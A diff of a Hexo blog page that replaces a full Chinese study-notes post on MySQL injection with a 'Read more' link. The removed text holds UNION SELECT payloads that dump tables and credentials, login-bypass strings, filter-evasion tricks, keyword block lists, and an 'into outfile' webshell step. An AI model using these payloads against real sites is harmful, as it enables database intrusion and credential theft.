@@ -340,7 +340,7 @@
                 
               
 
-              <time title="Created: 2019-03-24 17:27:02 / Modified: 17:27:30" itemprop="dateCreated datePublished" datetime="2019-03-24T17:27:02+08:00">2019-03-24</time>
+              <time title="Created: 2019-03-24 17:27:02 / Modified: 17:29:07" itemprop="dateCreated datePublished" datetime="2019-03-24T17:27:02+08:00">2019-03-24</time>
             
 
             
@@ -379,101 +379,15 @@
 
       
         
-          
-            <h4 id="mysql介绍及操作"><a href="#mysql介绍及操作" class="headerlink" title="mysql介绍及操作"></a>mysql介绍及操作</h4><p>增删语句</p>
+          <h4 id="mysql介绍及操作"><a href="#mysql介绍及操作" class="headerlink" title="mysql介绍及操作"></a>mysql介绍及操作</h4><p>增删语句</p>
 <p>information_schema是一个很重要的库，information_schema.tables</p>
-<ul>
-<li><p>mysql的一些函数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">system_user() # 系统用户名</span><br><span class="line">user()	# 用户名	----</span><br><span class="line">current_user</span><br><span class="line">session_user()	# 连接数据库的用户名</span><br><span class="line">database()	# 数据库名	-----</span><br><span class="line">version()	# 数据库版本	-----</span><br><span class="line">load_file()	# 读取本地文件</span><br><span class="line">@@datadir	# 读取数据库路径</span><br><span class="line">@@basedir	# Mysql安装路径</span><br><span class="line">@@version_compile_os # OS</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>mysql数据库连接</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $host=&apos;localhost&apos;;	//数据库地址</span><br><span class="line">	$database=&apos;sui&apos;;	//数据库名称</span><br><span class="line">	$user=&apos;root&apos;;		//帐户</span><br><span class="line">	$passed=&apos;&apos;;			//密码</span><br><span class="line">	$webml=&apos;/0/&apos;;		//安装文件夹</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>如果是root权限的话，可以进一步提权；config、inc、data、common.inc</p>
-<p>==了解各种cms==</p>
-</li>
-</ul>
-<h4 id="mysql注入原理"><a href="#mysql注入原理" class="headerlink" title="mysql注入原理"></a>mysql注入原理</h4><ol>
-<li><p>注入形成原理</p>
-<p>get接收一个值，看他有没有过滤；</p>
-</li>
-<li><p>简单防注入实现</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function check_sql($x)</span><br><span class="line">&#123;</span><br><span class="line">    $inject = array(&apos;and&apos;,&apos;union&apos;,&apos;select&apos;,&apos;from&apos;,&apos;or&apos;);</span><br><span class="line">    $i = str_replace($injection, &quot;&quot;, $x);</span><br><span class="line">    return i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id = $_GET[&apos;id&apos;];</span><br><span class="line">select * from admin where id=$id;</span><br><span class="line"></span><br><span class="line">function inject_check($str)</span><br><span class="line">&#123;</span><br><span class="line">    $temp = eregi(&apos;and|select|insert|update|delete|\&apos;|\/\*|\*|\.\.\/|\.\/|union|into&apos;,$str);</span><br><span class="line">    if($temp)&#123;</span><br><span class="line">        echo &quot;输入非法内容&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>绕过防注入</p>
-<p>比如改变大小写，嵌套关键字aandnd</p>
-</li>
-</ol>
-<h4 id="mysql注入其他操作"><a href="#mysql注入其他操作" class="headerlink" title="mysql注入其他操作"></a>mysql注入其他操作</h4><ol>
-<li><p>判断注入</p>
-</li>
-<li><p>判断列数</p>
-<p>oder by 10，返回正常就表示有10列</p>
-</li>
-<li><p>联合查询</p>
-<p><code>id=13 union select 1,2,3,4,5,6,7,8,9,10</code></p>
-<p>按理说，如果前面查询出来的不是数字，那他和后面的10个数字中的某一个类型就会不匹配，就应该报错；</p>
-<p>但是我的navicat并没有报错；重点就是利用这个报错显示信息； sqlserver没有这些； <em>第二列是字符类型</em></p>
-<ul>
-<li><p>查询版本</p>
-<p><code>id=13 union select 1,version(),3,4,5,6,7,8,9,10</code></p>
-</li>
-<li><p>查询用户</p>
-<p><code>id=13 union select 1,user(),3,4,5,6,7,8,9,10</code></p>
-</li>
-<li><p>查询数据库</p>
-<p><code>id=13 union select 1,database(),3,4,5,6,7,8,9,10</code></p>
-</li>
-<li><p>查询表</p>
-<p><code>id=13 union select 1,group_concat(table_name),3,4,5,6,7,8,9,10 from information_schema.tables where table_shema=xy # xy应转换为16进制</code></p>
-<p>直接’xy’不也行嘛？</p>
-</li>
-<li><p>查询列</p>
-<p><code>id=13 union select 1,group_concat(column_name),3,4,5,6,7,8,9,10 from information_schema.columns where table_name=&#39;user&#39;</code></p>
-</li>
-<li><p>查询数据</p>
-<p><code>id=13 union select 1,group_concat(name,0x7e,pwd),3,4,5,6,7,8,9,10 from user</code></p>
-<p>0x7e是一个特殊字符 ~</p>
-</li>
-</ul>
-</li>
-</ol>
-<ul>
-<li><p>mysql4.0渗透</p>
-<p>它没有information_schema表，所以不能爆出所有的表名列名；只能用字典爆破；</p>
-<p>利用sqlmap读文件；</p>
-</li>
-<li><p>mysql显错注入</p>
-<p><em>先百度，视频里就是直接复制粘贴就用了</em></p>
-</li>
-<li><p>后台绕过</p>
-<p>有时，#把后面的sql语句注释掉</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username=&apos;&apos; and password=&apos;&apos;</span><br><span class="line"># 输入admin&apos;#</span><br><span class="line"># 输入admin&apos; or &apos;1=1</span><br><span class="line"># 多试试几个闭合</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>mysql读写函数的使用</p>
-<p>load_file()函数，参数是绝对路径；用法和之前的暴库差不多；</p>
-<p>那绝对路径怎么找？ <code>c:/windows/system32/instsrv/metabase.xml</code></p>
-<blockquote>
-<p>报错显示；google hack搜索warning信息； 遗留文件phpinfo info test php； 漏洞爆路径；读取配置文件；</p>
-<p>上传报错比较容易：上传一个错误的东西，可能会把绝对路径爆出来；</p>
-</blockquote>
-</li>
-<li><p>利用注入漏洞执行系统命令</p>
-<p>必须要root权限； <code>into outfile &#39;c.php&#39;</code></p>
-<p>可以导入一句话；可以创建用户；</p>
-</li>
-<li><p>魔术引号与宽字节注入</p>
-<p>宽字节注入：是PHP的配置问题，<code>magic_quotes_runtime</code>；’会变成’</p>
-<p>sqlmap——unmagicquotes；<code>--tamper unmagicquotes.py</code></p>
-</li>
-</ul>
-<blockquote>
-<p>正则表达式还是需要熟悉，尤其是转义这一块</p>
-<p>url编码需要了解；</p>
-<p>转16进制可以绕过 ‘ 被过滤的情况</p>
-<p>mysql显错注入的了解；</p>
-</blockquote>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/03/24/mysql注入/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
